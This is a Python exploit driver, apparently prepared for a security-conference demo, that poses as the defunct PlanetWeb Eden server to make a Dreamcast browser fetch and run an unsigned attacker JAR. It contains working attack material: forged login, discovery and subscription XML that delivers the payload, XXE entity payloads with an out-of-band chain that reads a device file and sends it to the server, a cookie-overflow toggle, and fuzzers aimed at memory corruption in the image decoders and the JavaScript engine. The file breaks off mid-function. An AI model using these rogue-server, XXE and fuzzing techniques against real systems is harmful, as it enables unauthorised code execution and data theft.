#!/usr/bin/env python3
"""
eden_mitm.py -- MITM / rogue-server exploit driver for the Sega Dreamcast
PlanetWeb Internet Browser v3.0 (Eden client).

It impersonates the dead Planetweb backend (eden.planetweb.com). The victim
must resolve eden.planetweb.com -> this box (DNS/DHCP on real hardware via
DreamPi, or /etc/hosts / emulator DNS redirect). The browser then walks itself
into running our code:

    GET  /edenclient.conf              -> tells the client where 'loginurl' is
    POST /login                        -> login:response  (status 0) + discovery:url
    POST /discovery                    -> discovery:response: one service + subscription-url
    POST /subscribe                    -> subscription:response: service-download-url
    GET  /pwn.jar                      -> the attacker service JAR (downloaded + executed)
    GET  /junkyard.html, /junkyard.gif -> splash page the payload navigates to
    GET  /doom.bin                     -> stage-2 payload slot (see README)

All transport is plaintext HTTP and no JAR signature is verified, so simply
answering for the host is enough -- no memory corruption required.

Wire format reverse-engineered from the decompiled handlers:
  * XML parser is namespace-AWARE but matches on the QUALIFIED name
    (prefix:local), so prefixes (login:, device:, service: ...) are mandatory
    and every prefix must be declared. <service> itself is matched UNPREFIXED.
  * status values are prefixed ATTRIBUTES (login:status="0" etc.); 0 == success.
  * element text is read via the first #text child, so keep leaves single-line.
"""
import argparse
import re
import sys
import os
import glob
import struct
import random
import time
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path

ROOT = Path(__file__).resolve().parent
WWW = ROOT / "www"
DOOM_JAR = ROOT / "build" / "doom.jar"
# chain -> service jar served at /pwn.jar
CHAIN_JARS = {
    "splash": ROOT / "build" / "pwn_splash.jar",
    "calc":   ROOT / "build" / "pwn_calc.jar",
    "jdoom":  ROOT / "build" / "pwn_jdoom.jar",
    "native": ROOT / "build" / "pwn_native.jar",
    "overflow": ROOT / "build" / "pwn_overflow.jar",
    "fuzz": ROOT / "build" / "pwn_fuzz.jar",
    "takeover": ROOT / "build" / "pwn_takeover.jar",
    "ridexploit": ROOT / "build" / "pwn_ridexploit.jar",
    "nativedoom": ROOT / "build" / "pwn_nativedoom.jar",
    "heapprobe": ROOT / "build" / "pwn_heapprobe.jar",
    "armexploit": ROOT / "build" / "pwn_armexploit.jar",
    "looparm": ROOT / "build" / "pwn_looparm.jar",
    "stagedoom": ROOT / "build" / "pwn_stagedoom.jar",
}
CHAIN = "jdoom"   # overridden by --chain
# prefer the tiny ~95KB single-room WAD (fits the browser's small applet heap),
# then the trimmed E1M1, then full Freedoom.
_mini = ROOT / "wad" / "doom_mini.wad"
_trim = ROOT / "wad" / "doom_e1m1.wad"
DOOM_WAD = _mini if _mini.exists() else (_trim if _trim.exists() else (ROOT / "wad" / "freedoom1.wad"))

# The host the client believes it is talking to. Keep as the real Planetweb host
# so the hardcoded URLs in our XML match what the device resolves to us.
EDEN_HOST = "eden.planetweb.com"


def base_url():
    return "http://" + EDEN_HOST

# ---- XXE weaponization (com.planetweb.xml.XMLParser is unhardened; parses every
# Eden login/discovery/subscribe response) -- toggle with EDEN_XXE=1 ----
XXE = os.environ.get("EDEN_XXE")
XXE_FILE = os.environ.get("EDEN_XXE_FILE", "file:///flashrom")   # OOB exfil target (tunable)
COOKIE_N = int(os.environ.get("EDEN_COOKIE", "0"))   # PATH A: Set-Cookie value length (overflow the request builder's "Cookie: %s")

def xxe_block(root):
    """DOCTYPE injected before a response root. Contains:
      - general entity &ssrf;  -> fetched from our server when referenced in body
        (reliable confirmation that external entities resolve = XXE).
      - parameter-entity OOB chain (%file -> %dtd -> %send) -> reads XXE_FILE and
        exfils its content to /xxe-leak via an external DTD we serve."""
    b = base_url()
    if XXE == "internal":      # diagnostic: internal entity (no network) -> tells us if
        # DTD/entity processing works at all (vs external resolution being disabled)
        return "<!DOCTYPE " + root + ' [<!ENTITY ssrf "INTXXEOK">]>'
    dt = "<!DOCTYPE " + root + " [" + '<!ENTITY ssrf SYSTEM "' + b + '/xxe-probe">'
    if XXE == "full":          # add OOB file-exfil chain (risks parse-fail if file absent)
        dt += ('<!ENTITY % file SYSTEM "' + XXE_FILE + '">'
               + '<!ENTITY % dtd SYSTEM "' + b + '/xxe.dtd">'
               + "%dtd;%send;")
    return dt + "]>"

def xxe_dtd():
    """OOB exfil DTD: build a 'send' parameter entity whose SYSTEM URL embeds the
    target file's content, then trigger it."""
    b = base_url()
    return ('<!ENTITY % all "<!ENTITY &#37; send SYSTEM \'' + b
            + '/xxe-leak?f=%file;\'>">' + "%all;")


# --- the config file that bootstraps the login URL ------------------------- #
def pwned_page(devid, os_str):
    # Full-screen RCE-takeover page (the live-demo opener). Old-HTML-safe:
    # bgcolor/text/font size+color + an animated GIF banner + leaked device id.
    if not devid: devid = "(locked)"
    return (
      '<html><head><title>OWNED</title></head>'
      '<body bgcolor="#000000" text="#ff2020" link="#ff8800">'
      '<center>'
      '<br><img src="/pwned.gif" width="512" height="128">'
      '<br><br><font size="7" color="#ff2020"><b>*** YOUR DREAMCAST IS OWNED ***</b></font>'
      '<br><font size="5" color="#ffaa00"><b>DistrictCon Junkyard</b></font>'
      '<br><br><font size="4" color="#ffffff">Unauthenticated Remote Code Execution</font>'
      '<br><font size="3" color="#bbbbbb">via PlanetWeb "Eden" v3.0  --  over a spoofed, expired eden.planetweb.com</font>'
      '<br><br><font size="4" color="#00ff66">RAW DEVICE ID:&nbsp; <b>' + devid + '</b></font>'
      '<br><font size="3" color="#88ff88">RUNNING ON:&nbsp; ' + (os_str or "Sega Dreamcast / SH-4") + '</font>'
      '<br><br><font size="2" color="#ff8888">no memory corruption needed: the browser trusts a dead domain '
      'and runs our unsigned code  --  fully privileged (no SecurityManager)</font>'
      '<br><br><img src="/e1m1_doom.png" width="360">'
      '</center></body></html>')

def edenclient_conf():
    # java.util.Properties format. Point loginurl back at us.
    return "loginurl=" + base_url() + "/login\n"


# --- XML responses --------------------------------------------------------- #
def login_response(device_id):
    dt = xxe_block("login:response") if XXE else ""
    ref = "&ssrf;" if XXE else ""        # general-entity ref in body -> SSRF confirm
    return (
        '<?xml version="1.0"?>' + dt +
        '<login:response'
        ' xmlns:login="http://www.planetweb.com/login"'
        ' xmlns:device="http://www.planetweb.com/device"'
        ' xmlns:token="http://www.planetweb.com/token"'
        ' xmlns:session="http://www.planetweb.com/session"'
        ' xmlns:discovery="http://www.planetweb.com/discovery"'
        ' login:status="0">'
        '<device:id>' + device_id + ref + '</device:id>'
        '<token:data>junkyardtoken</token:data>'
        '<session:id>junkyardsession</session:id>'
        '<discovery:url>' + base_url() + '/discovery</discovery:url>'
        '</login:response>'
    )


def discovery_response():
    return (
        '<?xml version="1.0"?>'
        '<discovery:response'
        ' xmlns:discovery="http://www.planetweb.com/discovery"'
        ' xmlns:service="http://www.planetweb.com/service"'
        ' discovery:status="0">'
        '<service>'
        '<service:name>JunkyardService</service:name>'
        '<service:subscription-url>' + base_url() + '/subscribe</service:subscription-url>'
        '</service>'
        '</discovery:response>'
    )


def subscription_response():
    return (
        '<?xml version="1.0"?>'
        '<subscription:response'
        ' xmlns:subscription="http://www.planetweb.com/subscription"'
        ' subscription:status="0">'
        '<subscription:service-download-url>' + base_url() + '/pwn.jar'
        '</subscription:service-download-url>'
        '</subscription:response>'
    )


DEVID_RE = re.compile(rb"<device:id>(.*?)</device:id>", re.S)

# ------------------------- dynamic browser-parser fuzzing -------------------------
# Each /fz/ request mutates a FRESH batch of images and returns a page that
# auto-refreshes (meta + JS) to a NEW unique /fz/ URL -> the browser loops,
# decoding new fuzzed GIF/JPEGs continuously until a decoder crashes. No reboots.
FUZZ_SEEDS = ROOT / "fuzz_seeds"
FZ_DIR     = WWW / "fuzz"
FUZZ_BATCH = 8            # mutated images per page
FUZZ_REFRESH = 3          # seconds between page refreshes
_fuzz_ctr = [0]

# NEW fuzzer: fault-weighted, structure-preserving mutations. Aim for OOB WRITES
# (memory corruption -> SH4 fault) rather than infinite loops. Known DoS-hang
# mutations (GIF LZW code size >8, GIF dims >4096) are DOWN-WEIGHTED so the loop
# keeps hunting faults instead of freezing.
def _gif_mut(b):
    b = bytearray(b)
    s = random.choice(["ct","subblk","lzwdata","imgpos","rand","rand","rand"])  # hang class dropped
    if s == "ct" and len(b) >= 11:                     # claim large color table, little data -> over-read/write
        b[10] = 0xF0 | random.randint(0,7)
    elif s == "subblk":                                # corrupt a data sub-block length (claim more than present)
        i = b.find(b"\x2c")
        if i >= 0 and i+11 < len(b): b[i+11] = 0xFF
    elif s == "lzwdata":                               # valid code size, garbage codes -> dictionary growth past bound
        i = b.find(b"\x2c")
        if i >= 0 and i+11 < len(b):
            b[i+10] = random.randint(2,8)              # KEEP code size legal (avoid hang)
            for k in range(i+12, min(i+12+random.randint(20,120), len(b))): b[k] = random.randrange(256)
    elif s == "imgpos":                                # image extends past canvas (moderate, not huge)
        i = b.find(b"\x2c")
        if i >= 0 and i+9 < len(b):
            b[i+5:i+7] = struct.pack("<H", random.choice([256,512,1024,2048]))
            b[i+7:i+9] = struct.pack("<H", random.choice([256,512,1024,2048]))
    elif s == "hang":                                  # rare: known DoS classes (kept for coverage)
        i = b.find(b"\x2c")
        if i >= 0 and i+10 < len(b): b[i+10] = random.choice([12,0]);
    else:
        for _ in range(random.randint(2,14)): b[random.randrange(len(b))] = random.randrange(256)
    return bytes(b)

def _jpg_mut(b):
    # JPEG decoder = richer write surface (Huffman/quant/component tables) -> fault-prone
    b = bytearray(b)
    # diversified set: DHT down-weighted (it saturates / is already confirmed);
    # emphasize less-explored markers to hunt NEW classes.
    s = random.choice(["dht","sof","dqt","dqt","sos","dri",
                       "progparam","seglen","markerinj","app","sofprec","rand","rand"])
    if s == "dht":                                     # Huffman counts summing >256 -> classic code-array overflow
        i = b.find(b"\xff\xc4")
        if i >= 0 and i+21 < len(b):
            for k in range(i+5, i+21): b[k] = random.choice([0xff,0x80,0x40])
    elif s == "progparam":                             # progressive scan params Ss/Se/Ah/Al (SOS tail)
        i = b.find(b"\xff\xda")
        if i >= 0:
            ln = (b[i+2]<<8)|b[i+3]; end = i+2+ln
            if end <= len(b) and end-3 >= 0:
                for k in range(end-3, end): b[k] = random.choice([0,63,64,0xff,random.randrange(256)])
    elif s == "seglen":                                # corrupt a marker's length -> over-read past segment
        for m in (b"\xff\xc4", b"\xff\xdb", b"\xff\xc0", b"\xff\xc2", b"\xff\xda"):
            i = b.find(m)
            if i >= 0 and i+4 < len(b):
                b[i+2:i+4] = struct.pack(">H", random.choice([0xffff,0xff00,0x0001,0x0003,2048])); break
    elif s == "markerinj":                             # inject a spurious/duplicate marker before SOS
        i = b.find(b"\xff\xda")
        if i >= 0:
            inj = random.choice([b"\xff\xc4\x00\x05\x00\x01\x00",   # tiny DHT
                                 b"\xff\xdb\x00\x03\x00",            # truncated DQT
                                 b"\xff\xdd\x00\x04\xff\xff",        # DRI huge
                                 b"\xff\xc0\x00\x05\x08\x00"])       # truncated SOF
            b[i:i] = inj
    elif s == "app":                                   # APP0/APPn length + payload
        i = b.find(b"\xff\xe0")
        if i >= 0 and i+4 < len(b):
            b[i+2:i+4] = struct.pack(">H", random.choice([0xffff,0x0002,0xff00]))
    elif s == "sofprec":                               # sample precision byte (legal 8/12) -> bad bit depth
        for m in (b"\xff\xc0", b"\xff\xc2"):
            i = b.find(m)
            if i >= 0 and i+4 < len(b): b[i+4] = random.choice([0,1,16,0x20,0xff]); break
    elif s == "components":                            # component count / ids / sampling mismatch
        for m in (b"\xff\xc0", b"\xff\xc2"):
            i = b.find(m)
            if i >= 0 and i+9 < len(b):
                b[i+9] = random.choice([0,4,5,0x10,0xff])               # Nf components
                if i+12 < len(b): b[i+11] = random.choice([0x11,0x22,0xff])  # sampling factors
                break
    elif s == "sof":                                   # moderate-large dims (allocate+write, avoid 65535 hang)
        for m in (b"\xff\xc0", b"\xff\xc2"):
            i = b.find(m)
            if i >= 0 and i+9 < len(b):
                b[i+5:i+7] = struct.pack(">H", random.choice([1024,2048,4096,8192]))
                b[i+7:i+9] = struct.pack(">H", random.choice([1024,2048,4096,8192])); break
    elif s == "dqt":
        i = b.find(b"\xff\xdb")
        if i >= 0 and i+4 < len(b): b[i+4] = random.choice([0x10,0xff,0x05])  # bad precision/table id
    elif s == "sos":                                   # scan component selector / count mismatch
        i = b.find(b"\xff\xda")
        if i >= 0 and i+5 < len(b): b[i+4] = random.choice([0,4,5,0xff])
    elif s == "dri":                                   # restart interval
        b[2:2] = b"\xff\xdd\x00\x04" + struct.pack(">H", random.choice([1,0xffff]))
    else:
        for _ in range(random.randint(2,16)): b[random.randrange(len(b))] = random.randrange(256)
    return bytes(b)

def _png_mut(b):
    # PNG decoder (libpng-derived, confirmed in ROM: IHDR validation strings +
    # zlib 1.1.3). Mutate IHDR fields / chunk lengths / IDAT zlib stream; recompute
    # the chunk CRC for field mutations so the malformed value reaches the decoder
    # logic (not just the CRC check).
    import zlib
    b = bytearray(b)
    chunks = []; i = 8
    while i + 12 <= len(b):
        ln = int.from_bytes(b[i:i+4], "big"); typ = bytes(b[i+4:i+8])
        chunks.append((i, ln, typ)); i += 12 + ln
        if ln > len(b): break
    def fixcrc(off, ln):
        crc = zlib.crc32(bytes(b[off+4:off+8+ln])) & 0xffffffff
        b[off+8+ln:off+12+ln] = struct.pack(">I", crc)
    s = random.choice(["dims","depth","color","interlace","chunklen","idat","plte","rand","rand"])
    ihdr = next((c for c in chunks if c[2] == b"IHDR"), None)
    if s in ("dims","depth","color","interlace") and ihdr:
        off, ln, _ = ihdr; d = off + 8                 # IHDR: W(4)H(4)depth(1)color(1)comp(1)filt(1)interlace(1)
        if s == "dims":                                # huge dims -> W*H*channels buffer-size overflow
            b[d:d+4]   = struct.pack(">I", random.choice([0xFFFFFFFF,0x7FFFFFFF,0x10000,0xFFFF,0]))
            b[d+4:d+8] = struct.pack(">I", random.choice([0xFFFFFFFF,0x10000,0xFFFF,1]))
        elif s == "depth":  b[d+8]  = random.choice([0,3,7,16,32,255])   # legal 1,2,4,8,16
        elif s == "color":  b[d+9]  = random.choice([1,5,7,8,255])       # legal 0,2,3,4,6
        elif s == "interlace": b[d+12] = random.choice([2,3,255])        # legal 0,1 (Adam7 path)
        if d+12 < len(b): fixcrc(off, ln)
    elif s == "chunklen" and chunks:                   # over-long chunk length -> over-read
        off = random.choice(chunks)[0]
        b[off:off+4] = struct.pack(">I", random.choice([0xFFFFFFFF,0x10000,0xFFFF]))
    elif s == "idat":                                  # corrupt zlib stream -> inflate OOB / bomb
        idat = next((c for c in chunks if c[2] == b"IDAT"), None)
        if idat:
            off, ln, _ = idat
            for _ in range(random.randint(2,12)):
                if ln > 0: b[off+8+random.randrange(ln)] = random.randrange(256)
            fixcrc(off, ln)
    elif s == "plte":                                  # palette size mismatch -> index OOB
        plte = next((c for c in chunks if c[2] == b"PLTE"), None)
        if plte:
            off = plte[0]; b[off:off+4] = struct.pack(">I", random.choice([0xFFFF,3,768,0]))
    else:
        for _ in range(random.randint(2,16)): b[random.randrange(len(b))] = random.randrange(256)
    return bytes(b)

def _wav_mut(b):                                       # RIFF/WAVE audio parser (chunk-size overruns)
    b = bytearray(b)
    s = random.choice(["riffsize","datasize","fmtsize","chans","bits","rate","rand"])
    if s == "riffsize" and len(b) >= 8:
        b[4:8] = struct.pack("<I", random.choice([0xFFFFFFFF,0x10000,2]))
    elif s == "datasize":
        i = b.find(b"data");  i>=0 and i+8<=len(b) and b.__setitem__(slice(i+4,i+8), struct.pack("<I", random.choice([0xFFFFFFFF,0x10000,0])))
    elif s == "fmtsize":
        i = b.find(b"fmt ");  i>=0 and i+8<=len(b) and b.__setitem__(slice(i+4,i+8), struct.pack("<I", random.choice([0xFFFF,0,1,0x10000])))
    elif s == "chans":
        i = b.find(b"fmt ");  i>=0 and i+12<=len(b) and b.__setitem__(slice(i+10,i+12), struct.pack("<H", random.choice([0,0xFFFF,256])))
    elif s == "bits":
        i = b.find(b"fmt ");  i>=0 and i+24<=len(b) and b.__setitem__(slice(i+22,i+24), struct.pack("<H", random.choice([0,1,7,255,0xFFFF])))
    elif s == "rate":
        i = b.find(b"fmt ");  i>=0 and i+16<=len(b) and b.__setitem__(slice(i+12,i+16), struct.pack("<I", random.choice([0,0xFFFFFFFF])))
    else:
        for _ in range(random.randint(2,12)): b[random.randrange(len(b))] = random.randrange(256)
    return bytes(b)

def _swf_mut(b):                                       # SWF/Flash (header + tag-length parsing)
    b = bytearray(b)
    s = random.choice(["filelen","ver","rect","tag","rand"])
    if s == "filelen" and len(b) >= 8:
        b[4:8] = struct.pack("<I", random.choice([0xFFFFFFFF,0x10000,2]))
    elif s == "ver" and len(b) >= 4: b[3] = random.choice([0,99,255])
    elif s == "rect" and len(b) > 8: b[8] = random.choice([0xF8,0xFF,0x00])  # rect nbits
    elif s == "tag" and len(b) > 10:
        p = random.randrange(8, len(b)-1); b[p:p+2] = struct.pack("<H", random.choice([0xFFFF,0xFFC0,0]))
    else:
        for _ in range(random.randint(2,12)): b[random.randrange(len(b))] = random.randrange(256)
    return bytes(b)

# ---- AFL-style mutation layer (strategies from github.com/google/AFL) ----
# We can't run AFL's coverage-guided fork-server (target = SH4 guest in Flycast),
# but its mutation engine + corpus/splice port directly. "interesting" values are
# AFL's INTERESTING_8/16/32 boundary tables (config.h).
AFL_I8  = [0x80,0xff,0x00,0x01,0x10,0x20,0x40,0x64,0x7f]
AFL_I16 = AFL_I8 + [0x8000,0xff7f,0x0080,0x00ff,0x0100,0x0200,0x03e8,0x0400,0x1000,0x7fff]
AFL_I32 = AFL_I16 + [0x80000000,0xfa0000fa,0xffff7fff,0x00008000,0x0000ffff,0x00010000,0x05ffff05,0x7fffffff]
_HDR = {"jpg":2,"jpeg":2,"gif":6,"png":8,"swf":3,"wav":4}   # bytes to preserve (magic) so decoder still engages

def _afl_havoc(b, hdr=8):
    """AFL havoc: a stacked sequence of random mutations. Destructive ops are kept
    past the magic (hdr) so the browser still routes to the decoder."""
    b = bytearray(b)
    if len(b) <= hdr + 1: return bytes(b)
    for _ in range(1 << random.randint(1,6)):
        L = len(b)
        if L <= hdr + 1: break
        p = random.randint(hdr, L-1); op = random.randint(0,10)
        if   op == 0: b[p] ^= 1 << random.randint(0,7)                 # flip a bit
        elif op == 1: b[p] = random.choice(AFL_I8)                     # interesting u8
        elif op == 2: b[p] = (b[p] + random.randint(-35,35)) & 0xff    # byte arith
        elif op == 3 and p+2 <= L:                                     # interesting u16
            f = "<H" if random.random()<.5 else ">H"; b[p:p+2] = struct.pack(f, random.choice(AFL_I16)&0xffff)
        elif op == 4 and p+2 <= L:                                     # u16 arith
            f = "<H" if random.random()<.5 else ">H"
            b[p:p+2] = struct.pack(f, (struct.unpack(f,bytes(b[p:p+2]))[0]+random.randint(-255,255))&0xffff)
        elif op == 5 and p+4 <= L:                                     # interesting u32 (len/dim fields)
            f = "<I" if random.random()<.5 else ">I"; b[p:p+4] = struct.pack(f, random.choice(AFL_I32)&0xffffffff)
        elif op == 6 and p+4 <= L:                                     # u32 arith
            f = "<I" if random.random()<.5 else ">I"
            b[p:p+4] = struct.pack(f, (struct.unpack(f,bytes(b[p:p+4]))[0]+random.randint(-4096,4096))&0xffffffff)
        elif op == 7: b[p] = random.randrange(256)                     # random byte
        elif op == 8 and L > hdr+4:                                    # delete a block
            ln = random.randint(1, min(32, L-hdr-1)); q = random.randint(hdr, L-ln); del b[q:q+ln]
        elif op == 9:                                                  # clone/insert a block
            ln = random.randint(1,32); s = random.randint(hdr, max(hdr, L-1)); b[p:p] = bytes(b[s:s+ln]) or bytes([random.randrange(256)])
        else:                                                          # overwrite block (repeat byte)
            ln = random.randint(1, min(32, L-p)); b[p:p+ln] = bytes([random.randrange(256)])*ln
    return bytes(b)

def _splice(a, b):
    """AFL splice: head of one input + tail of another (same format)."""
    if len(a) < 4 or len(b) < 4: return a
    return a[:random.randint(1,len(a)-1)] + b[random.randint(0,len(b)-1):]

def _corpus(ext):
    """Corpus = seeds + discovered crash culprits (known to reach deep decoder
    code) -> mutating/splicing these finds nearby variants & new faults."""
    files = glob.glob(str(FUZZ_SEEDS/("*."+ext)))
    files += glob.glob(str(ROOT/"crashes"/"auto_*"/("CULPRIT_*."+ext)))
    return files

# ---- gzip transport fuzzing (HTTP Content-Encoding: gzip -> zlib 1.1.3 inflate) ----
def _gzip_fuzz(raw):
    """gzip-wrap a valid resource then corrupt the gzip stream -> exercises the
    inflate/Content-Encoding path. Mutates header flags, the deflate body, or the
    trailing CRC32/ISIZE."""
    import gzip as _gz, io
    buf = io.BytesIO();
    with _gz.GzipFile(fileobj=buf, mode="wb") as g: g.write(raw)
    b = bytearray(buf.getvalue())
    s = random.choice(["flags","body","trailer","hdrlen","rand"])
    if s == "flags" and len(b) > 4:                # FLG byte (FEXTRA/FNAME/FCOMMENT/FHCRC) -> bad optional-field parse
        b[3] = random.choice([0x04,0x08,0x10,0x1f,0xe0,0xff])
    elif s == "body" and len(b) > 14:              # corrupt deflate stream -> inflate OOB/desync
        for _ in range(random.randint(2,10)): b[random.randint(10,len(b)-9)] = random.randrange(256)
    elif s == "trailer" and len(b) >= 8:           # CRC32 / ISIZE mismatch
        b[-8:] = bytes(random.randrange(256) for _ in range(8))
    elif s == "hdrlen" and len(b) > 12:            # claim FEXTRA with huge XLEN -> over-read
        b[3] = 0x04; b[10:10] = struct.pack("<H", random.choice([0xffff,0x1000]))
    else:
        for _ in range(random.randint(2,12)): b[random.randint(0,len(b)-1)] = random.randrange(256)
    return bytes(b)

# ---- Java .class loader/verifier fuzzing (PersonalJava VM; via <applet archive>) ----
CLASS_BASE = FUZZ_SEEDS / "Pwn.class"   # minimal v45.3 applet, mutated per page
def _class_mut(b):
    """Mutate a Java .class to stress the PersonalJava class loader/VERIFIER:
    magic / version / constant_pool_count / counts+indices / truncation / havoc.
    A verifier flaw here is VM-level RCE, not just DoS."""
    b = bytearray(b)
    s = random.choice(["magic","ver","cpcount","cpgrow","u16","count","trunc","havoc","havoc"])
    if   s == "magic": b[0:4] = bytes(random.randrange(256) for _ in range(4))            # break/skip magic check
    elif s == "ver" and len(b) >= 8:  b[6:8] = struct.pack(">H", random.choice([0,46,50,99,0xffff]))   # major version
    elif s == "cpcount" and len(b) >= 10: b[8:10] = struct.pack(">H", random.choice([0,1,0x7fff,0xffff]))  # constant_pool_count
    elif s == "cpgrow" and len(b) >= 10:                                                  # claim more CP entries than present -> over-iterate
        b[8:10] = struct.pack(">H", (struct.unpack(">H", bytes(b[8:10]))[0] + random.randint(50,4000)) & 0xffff)
    elif s == "u16" and len(b) > 12:                                                      # a random u16 (index/count) -> OOB CP ref
        p = random.randrange(8, len(b)-1); b[p:p+2] = struct.pack(">H", random.choice([0xffff,0x7fff,0]))
    elif s == "count" and len(b) > 12:                                                    # fields/methods/attrs count -> huge
        p = random.randrange(8, len(b)-1); b[p:p+2] = b"\xff\xff"
    elif s == "trunc": b = b[:random.randint(8, max(9, len(b)-1))]                        # truncated class file
    else:
        for _ in range(random.randint(2,16)):
            if len(b) > 4: b[random.randrange(4, len(b))] = random.randrange(256)         # havoc (keep magic)
    return bytes(b)

def _jar_pack(classbytes, clsname="Pwn.class"):
    """Pack a (mutated) class into a valid JAR/zip so the zip layer opens cleanly
    and the CLASS parser/verifier is what gets fuzzed."""
    import io, zipfile
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_STORED) as z:
        z.writestr("META-INF/MANIFEST.MF", "Manifest-Version: 1.0\r\n\r\n")
        z.writestr(clsname, bytes(classbytes))
    return buf.getvalue()

# ---- JavaScript engine fuzzing (native JS interpreter @0x8c18b6b0; via <script>) ----
_JS_TOK = ["function","var","return","new ","this","prototype","eval","[]","{}","()",
           "typeof ","delete ","with","try","catch","arguments",".length",".push",
           "Function","Object","Array","String",".call",".apply","+","++","==","void "]
def _js_mut(src):
    """Mutate JS to stress the native parser/interpreter: token spam, deep nesting,
    huge literals, malformed syntax, prototype/type-confusion idioms, deep recursion,
    and AFL byte havoc."""
    s = src
    op = random.choice(["nest","deepnest","huge","dup","tok","delim","proto","recurse","afl","afl"])
    if   op == "dup":  s = s + ("\n" + random.choice(_JS_TOK)) * random.randint(50, 600)
    elif op == "nest":                                  # moderate nesting (deep-nest=DoS hang, confirmed; keep mixed-run usable)
        d = random.randint(50, 4000); s = "(" * d + "1" + ")" * d + ";" + s
    elif op == "deepnest":
        ch = random.choice(["[", "{a:", "f("]); cl = {"[":"]", "{a:":"}", "f(":")"}[ch]
        d = random.randint(50, 3000); s = "var z=" + ch * d + "1" + cl * d + ";" + s
    elif op == "huge":
        s = s + "\nvar H=" + ('"' + "A" * random.randint(1000, 30000) + '"' if random.random() < .5
                              else "[" + "1," * random.randint(500, 8000) + "1]") + ";"
    elif op == "tok":
        s = s + "\n" + "".join(random.choice(_JS_TOK) + random.choice([";", "", ".", "("])
                               for _ in range(random.randint(5, 50)))
    elif op == "delim":
        s = s + random.choice(["{" * random.randint(1, 300), "}" * random.randint(1, 300),
                               "[" * random.randint(1, 300), "function(", '"' + "x" * random.randint(1, 800)])
    elif op == "proto":
        s = s + "\nfunction X(){};X.prototype=" + random.choice(["X", "[]", "null", "X.prototype", "new X()"]) \
              + ";var y=new X();y.valueOf=y;y.toString=y;"
    elif op == "recurse":                              # deep recursion (guarded so it doesn't freeze the mixed run)
        s = "function R(n){var a=[n,n,n];return R(n+1)+R(n+2);}try{R(0)}catch(e){}\n" + s
    else:
        b = bytearray(s.encode("latin1", "ignore"))
        pool = [ord(c) for c in "(){}[];=+\"'.,0Af "]
        for _ in range(1 << random.randint(1, 5)):
            if len(b) < 2: break
            p = random.randrange(len(b)); b[p] = random.choice(pool + [random.randrange(256)])
        s = b.decode("latin1")
    return s.encode("latin1", "ignore")

def _js_page(bid, driver):
    """Page with INLINE fuzzed JS (this browser doesn't load external <script src>)
    + an <img> beacon for crash attribution. '</' is neutralized so the mutated JS
    can't break out of the <script> tag; the raw .js is saved for repro."""
    js = _js_mut(open(random.choice(glob.glob(str(FUZZ_SEEDS/"*.js")))).read())
    nm = "ff_%05d.js" % bid
    open(str(FZ_DIR/nm), "wb").write(js)
    inline = js.decode("latin1", "ignore").replace("</", "< /")
    return ('<html><head>%s</head><body bgcolor=black>'
            '<img src="/fuzz/%s" width=1 height=1>'
            '<script>%s</script>%s</body></html>' % (driver[0], nm, inline, driver[1]))

# ---- HTML lexer fuzzing (flex lexer: "scanner input buffer overflow") ----
_HTAGS = ["html","body","table","tr","td","div","span","font","a","img","b","i","ul","li",
          "form","input","frame","frameset","applet","script","style","title","head","p"]
def _html_fuzz():
    """Generate malformed HTML to stress the flex lexer / DOM builder: huge
    attributes, deep nesting, unterminated tags, entity/comment tricks."""
    out = []
    for _ in range(random.randint(20, 120)):
        c = random.random(); t = random.choice(_HTAGS)
        if   c < 0.30: out.append("<%s %s=%s>" % (t, "x"*random.randint(1,2000), "y"*random.randint(1,4000)))  # huge attr
        elif c < 0.45: out.append("<" + t*random.randint(1,40))                                                # unterminated / long tag name
        elif c < 0.60: out.append("<%s>" % t * random.randint(1,60))                                           # deep nesting
        elif c < 0.72: out.append("&" + "#"*random.randint(1,200) + str(random.randint(0,1<<20)) + ";")        # entity bomb
        elif c < 0.82: out.append("<!--" + "-"*random.randint(1,500))                                          # unterminated comment
        elif c < 0.90: out.append('<a href="' + "A"*random.randint(1,5000) + '">')                            # huge URL
        else:          out.append("<%s %s>" % (t, "=\""*random.randint(1,300)))                                # malformed attr quotes
    return "".join(out)

def gen_fuzz_page(url_prefix="/fz/"):
    """NEW fuzzer: ONE mutated image per page (exact attribution + guaranteed
    decode) + auto-refresh to a new unique URL. ~60% JPEG (more fault-prone).
    url_prefix lets the loop drive via /fz/ (normal) or /rp/ (so the online
    savestate's /rp loop becomes the fuzzer -> unattended w/ fc_restore.sh)."""
    # all native media decoders confirmed present in 1ST_READ.BIN:
    # JPEG, GIF/LZW, PNG (libpng+zlib), SWF/Flash, WAV/RIFF. weight = pick frequency.
    fmts = {
        "jpg": (glob.glob(str(FUZZ_SEEDS/"*.jpg")), _jpg_mut, 3),
        "png": (glob.glob(str(FUZZ_SEEDS/"*.png")), _png_mut, 3),
        "gif": (glob.glob(str(FUZZ_SEEDS/"*.gif")), _gif_mut, 2),
        "swf": (glob.glob(str(FUZZ_SEEDS/"*.swf")), _swf_mut, 1),
        "wav": (glob.glob(str(FUZZ_SEEDS/"*.wav")), _wav_mut, 1),
    }
    pool = [ext for ext,(files,_,w) in fmts.items() if files for _ in range(w)]
    if not pool: return "<html><body>no seeds</body></html>", -1
    _fuzz_ctr[0] += 1; bid = _fuzz_ctr[0]
    # retain the last ~16 served samples (numeric sort -> real sequence order)
    def _kn(p):
        m = re.search(r"ff_(\d+)", p); return int(m.group(1)) if m else 0
    for f in sorted(glob.glob(str(FZ_DIR/"ff_*")), key=_kn)[:-16]:
        try: os.remove(f)
        except: pass
    nxt = "%sn%d_%d.html" % (url_prefix, bid+1, random.randrange(1<<30))
    driver = ('<meta http-equiv="refresh" content="%d;url=%s">' % (FUZZ_REFRESH, nxt),
              '<script>setTimeout(function(){location.href="%s";},%d000);</script>' % (nxt, FUZZ_REFRESH))
    kind = random.random()
    if os.environ.get("EDEN_JSONLY") and glob.glob(str(FUZZ_SEEDS/"*.js")):
        # JS-focused campaign: serve only fuzzed <script> so the JS engine gets
        # sustained coverage (image decoders crash so often they starve JS).
        return _js_page(bid, driver), bid
    # NOTE: <applet> class loading BLOCKS the browser main thread and stalls for
    # VALID and malformed classes alike (confirmed: a valid applet also freezes at
    # "Applet loading"), so a HANG is NOT a verifier-bug signal and every jar page
    # wrecks loop throughput. Class-loader fuzzing belongs in a GDB-stub harness
    # (bp in the loader ~0x8c0f93e8), not this loop. Disabled here (set >0 to probe
    # only for parse-time FAULTs, accepting the heavy stall cost).
    CLASS_IN_LOOP = 0.0
